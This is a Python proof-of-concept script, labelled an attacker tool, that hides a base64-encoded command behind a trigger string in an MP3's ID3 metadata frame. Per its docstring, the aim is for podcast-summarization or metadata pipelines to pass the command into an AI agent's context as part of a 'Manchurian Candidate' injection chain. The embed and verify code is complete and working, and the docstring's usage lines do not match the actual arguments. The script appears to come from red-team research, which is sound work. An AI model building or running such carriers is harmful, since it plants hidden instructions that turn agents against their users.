"""
embed_id3_payload.py -- Attacker tool: embed EXIF-style hook into an MP3 ID3 TXXX frame.

Purpose:
    Proof-of-concept demonstrating that MP3 ID3 tags are a viable payload carrier
    for the same Manchurian Candidate attack chain previously demonstrated with JPEG EXIF.
    Uses mutagen to write a TXXX (User-Defined Text) frame with the hardware affinity hook.

Usage:
    python3 embed_id3_payload.py --source clean.mp3 --output episode.mp3 --payload <b64>
    python3 embed_id3_payload.py --verify episode.mp3

Finding:
    Finding 3 (Universal Media Metadata Surface) - this script produces a format-agnostic
    payload carrier that any podcast summarization or audio metadata extraction pipeline
    would surface into an agent context window.
"""

import argparse
import base64
import shutil
import sys
from pathlib import Path

# Importerd at runtime - requires: pip install mutagen
try:
    from mutagen.mp3 import MP3
    from mutagen.id3 import ID3, TXXX, ID3NoHeaderError
except ImportError:
    print("[ERROR] mutagen not installed. Run: pip install mutagen", file=sys.stderr)
    sys.exit(1)

HOOK = "__ENV_HW_AFFINITY_OVR__"


def embed_payload(source: Path, output: Path, payload_b64: str) -> None:
    """
    Embed the hardware affinity hook into the MP3's ID3 TXXX frame.
    Copies source to output first, then writes the ID3 tag.
    Validates readback to confirm hook survived the save cycle.
    """
    shutil.copy2(source, output)

    try:
        tags = ID3(str(output))
    except ID3NoHeaderError:
        tags = ID3()

    hook_value = f"{HOOK}{payload_b64}"
    tags.add(TXXX(encoding=3, desc="HW_CONFIG", text=hook_value))
    tags.save(str(output))

    # Readback validation
    readback = ID3(str(output))
    txxx_frames = [f for f in readback.values() if f.FrameID == "TXXX"]
    confirmed = any(HOOK in (getattr(f, "text", [""])[0] if isinstance(getattr(f, "text", None), list) else "") for f in txxx_frames)

    if confirmed:
        decoded = base64.b64decode(payload_b64).decode("utf-8")
        print(f"  Hook readback: [PASS]")
        print(f"  Artifact created -> {output}")
        print(f"  Hook:    {HOOK}")
        print(f"  Payload: {decoded}")
    else:
        print("[FAIL] Hook not found in readback. ID3 write may have failed.", file=sys.stderr)
        sys.exit(1)


def verify_payload(mp3_path: Path) -> None:
    """Read and display the embedded hook from a TXXX frame."""
    tags = ID3(str(mp3_path))
    txxx_frames = [f for f in tags.values() if f.FrameID == "TXXX"]
    found = False
    for frame in txxx_frames:
        raw = frame.text[0] if isinstance(frame.text, list) else frame.text
        if HOOK in raw:
            payload_b64 = raw.split(HOOK)[1]
            decoded = base64.b64decode(payload_b64).decode("utf-8")
            print(f"[FOUND] Hook in ID3 TXXX frame (desc={frame.HashKey})")
            print(f"  Decoded payload: '{decoded}'")
            found = True
    if not found:
        print("[NOT FOUND] No hook in ID3 tags.")


def parse_args() -> argparse.Namespace:
    """Parse CLI arguments for embed or verify mode."""
    p = argparse.ArgumentParser(description="Embed or verify an ID3 TXXX payload hook in an MP3 file.")
    sub = p.add_subparsers(dest="mode")

    # Embed mode
    embed = sub.add_parser("embed", help="Embed a payload into an MP3 ID3 tag.")
    embed.add_argument("--source", required=True, type=Path, help="Source MP3 file.")
    embed.add_argument("--output", required=True, type=Path, help="Output MP3 file.")
    embed.add_argument("--payload", required=True, help="Base64-encoded payload command.")

    # Verify mode
    verify = sub.add_parser("verify", help="Verify the payload hook in an MP3 ID3 tag.")
    verify.add_argument("mp3_path", type=Path, help="MP3 file to verify.")

    return p.parse_args()


if __name__ == "__main__":
    args = parse_args()
    if args.mode == "embed":
        embed_payload(args.source, args.output, args.payload)
    elif args.mode == "verify":
        verify_payload(args.mp3_path)
    else:
        print("Usage: embed_id3_payload.py embed --source ... | verify <mp3>")
        sys.exit(1)
